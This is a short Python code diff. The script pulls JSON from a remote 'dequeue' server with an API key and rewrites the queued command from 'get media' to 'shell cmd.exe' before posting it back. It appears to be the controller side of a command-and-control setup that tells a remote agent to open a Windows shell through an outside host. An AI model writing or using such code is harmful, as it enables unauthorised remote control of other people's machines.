@@ -10,7 +10,7 @@ try:
     g = requests.get("https://itsokayboomer.com/dequeue/dequeue.php?api="+key)                                      #gets old json data and updates command to a different one and sends it back
     if(g.text != "API key does not exist!"):
         contents = json.loads(g.text)
-        contents["command"] = "get media"
+        contents["command"] = "shell cmd.exe"
 
     contents = json.dumps(contents)
     r = requests.post("https://itsokayboomer.com/dequeue/dequeue.php", data = {'api' : key, 'contents' : contents})
